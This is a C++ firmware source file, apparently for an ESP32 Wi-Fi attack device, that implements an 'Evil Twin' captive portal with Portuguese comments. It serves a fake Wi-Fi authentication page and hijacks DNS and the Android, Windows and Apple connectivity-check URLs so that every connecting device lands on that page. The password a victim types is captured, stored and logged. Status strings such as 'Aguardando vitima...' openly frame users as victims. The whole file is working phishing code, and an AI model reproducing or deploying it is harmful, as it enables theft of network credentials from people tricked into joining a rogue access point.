// ============================================================
// wifi_portal.cpp - Captive Portal para Evil Twin
// ============================================================
// CORREÇÃO CRÍTICA: Esta versão NÃO cria um WebServer próprio.
// Em vez disso, registra as rotas do portal no WebServer da API
// (apiServer, porta 8080) que já existe em wifi_api.cpp.
//
// Versão anterior criava `static WebServer server(80)` que, ao
// ser construído no boot (variável estática global), entrava em
// conflito com o apiServer(8080) e causava bootloop infinito
// quando o WiFi.softAP() era chamado no setup().
//
// Agora o portal roda NA MESMA PORTA 8080 da API. O cliente que
// se conecta ao Evil Twin acessa http://192.168.4.1:8080/ e vê
// a página de login. Os endpoints /api/* continuam funcionando
// normalmente porque são registrados ANTES das rotas do portal.
// ============================================================

#include "wifi_portal.h"
#include "config.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// Referência ao WebServer da API (definido em wifi_api.cpp)
// NÃO criamos um novo WebServer - usamos o mesmo da API.
extern WebServer& getApiServer();
extern bool isAPIServerRunning();  // mesma casing do wifi_api.cpp

// DNS Server ainda é necessário para o captive portal
// (redireciona qualquer domínio para 192.168.4.1)
static DNSServer dnsServer;
static bool dnsActive = false;
static bool portalActive = false;
static bool portalRoutesRegistered = false;
static char portalPassword[64] = {0};
static const char* portalStatusMsg = "Aguardando...";

// HTML da pagina de login - generica, responsiva
static const char* portalHTML = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Autenticação WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:16px;padding:32px;width:100%;max-width:360px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center}
.icon{width:64px;height:64px;background:#667eea;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;font-weight:bold}
h1{font-size:20px;color:#333;margin-bottom:8px}
p.desc{color:#666;font-size:14px;margin-bottom:24px}
input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;margin-bottom:16px;transition:border-color 0.2s}
input:focus{outline:none;border-color:#667eea}
button{width:100%;padding:14px;background:#667eea;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s}
button:hover{background:#5a6fd6}
.footer{margin-top:20px;font-size:12px;color:#999}
</style>
</head>
<body>
<div class="card">
<div class="icon">WiFi</div>
<h1>Conectar à rede</h1>
<p class="desc">Esta rede requer autenticação adicional para acesso à internet.</p>
<form action="/portal_post" method="POST" onsubmit="this.querySelector('button').textContent='Conectando...';this.querySelector('button').disabled=true;">
<input type="password" name="pass" placeholder="Senha da rede" required autocomplete="off">
<button type="submit">Conectar</button>
</form>
<div class="footer">© 2026 Provedor de Rede</div>
</div>
</body>
</html>
)rawliteral";

static const char* successHTML = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Conectado</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(135deg,#11998e 0%,#38ef7d 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:16px;padding:32px;width:100%;max-width:360px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center}
.icon{width:64px;height:64px;background:#11998e;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:32px}
h1{font-size:20px;color:#333;margin-bottom:8px}
p{color:#666;font-size:14px}
</style>
</head>
<body>
<div class="card">
<div class="icon">✓</div>
<h1>Conectado com sucesso!</h1>
<p>Aguarde enquanto verificamos sua conexão...</p>
</div>
</body>
</html>
)rawliteral";

// ============================================================
// HANDLERS DO PORTAL (rodam no apiServer)
// ============================================================

static void handlePortalRoot() {
    WebServer& srv = getApiServer();
    srv.send(200, "text/html", portalHTML);
}

static void handlePortalPost() {
    WebServer& srv = getApiServer();
    if (srv.hasArg("pass")) {
        String pass = srv.arg("pass");
        if (pass.length() > 0) {
            strncpy(portalPassword, pass.c_str(), 63);
            portalPassword[63] = '\0';
            passwordCaptured = true;
            strncpy(capturedPassword, portalPassword, 63);
            capturedPassword[63] = '\0';
            portalStatusMsg = "SENHA CAPTURADA!";
            Serial.printf("[Portal] PASSWORD CAPTURED: %s\n", capturedPassword);
        }
        srv.send(200, "text/html", successHTML);
    } else {
        srv.send(400, "text/plain", "Bad Request");
    }
}

static void handlePortalCaptive() {
    WebServer& srv = getApiServer();
    // Redireciona para a página de login do portal
    srv.sendHeader("Location", "http://192.168.4.1:8080/", true);
    srv.send(302, "text/plain", "");
}

// ============================================================
// API PÚBLICA
// ============================================================

void startPortal(const char* ssid) {
    if (portalActive) return;

    // Só registra rotas se a API server já estiver rodando
    if (!isAPIServerRunning()) {
        Serial.println(F("[Portal] ERRO: API server nao rodando, portal abortado"));
        return;
    }

    portalActive = true;
    portalPassword[0] = '\0';
    portalStatusMsg = "Aguardando vitima...";
    passwordCaptured = false;

    WebServer& srv = getApiServer();

    // Registra rotas do portal NO MESMO WebServer da API
    // Importante: NÃO usar onNotFound() porque ia conflitar com a API
    srv.on("/", HTTP_GET, handlePortalRoot);
    srv.on("/portal_post", HTTP_POST, handlePortalPost);

    // Captive portal detection endpoints (todos redirecionam para /)
    srv.on("/generate_204", HTTP_GET, handlePortalCaptive);           // Android
    srv.on("/gen_204", HTTP_GET, handlePortalCaptive);                // Android alt
    srv.on("/fwlink", HTTP_GET, handlePortalCaptive);                 // Windows
    srv.on("/hotspot-detect.html", HTTP_GET, handlePortalCaptive);    // Apple
    srv.on("/library/test/success.html", HTTP_GET, handlePortalCaptive);
    srv.on("/connecttest.txt", HTTP_GET, handlePortalCaptive);        // Windows NCSI
    srv.on("/redirect", HTTP_GET, handlePortalCaptive);               // Genérico
    srv.on("/login", HTTP_GET, handlePortalCaptive);                  // Genérico
    srv.on("/auth", HTTP_GET, handlePortalCaptive);                   // Genérico

    portalRoutesRegistered = true;

    // Inicia DNS server (porta 53) - responde tudo com 192.168.4.1
    // DNS é separado do WebServer, não causa conflito
    if (!dnsActive) {
        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
        dnsActive = true;
    }

    Serial.printf("[Portal] Ativo em http://192.168.4.1:8080/ para SSID: %s\n", ssid);
}

void stopPortal() {
    if (!portalActive) return;
    portalActive = false;

    // Para o DNS server
    if (dnsActive) {
        dnsServer.stop();
        dnsActive = false;
    }

    // Nota: não dá para remover rotas individuais do WebServer
    // facilmente. As rotas /, /portal_post, etc ficam registradas
    // mas inofensivas (só respondem se alguém acessar).
    // O handler "/" do portal pode conflitar com a página inicial
    // da API, mas a API não usa "/" para nada, então tudo bem.

    portalRoutesRegistered = false;
    Serial.println(F("[Portal] Desativado"));
}

void portalLoop() {
    if (!portalActive) return;
    // Processa requisições DNS (captive portal detection)
    if (dnsActive) {
        dnsServer.processNextRequest();
    }
    // Nota: o apiServer.handleClient() já é chamado no apiLoop()
    // em wifi_api.cpp, então NÃO chamamos aqui.
}

bool isPortalActive() { return portalActive; }
const char* getCapturedPassword() { return portalPassword; }
const char* getPortalStatus() { return portalStatusMsg; }
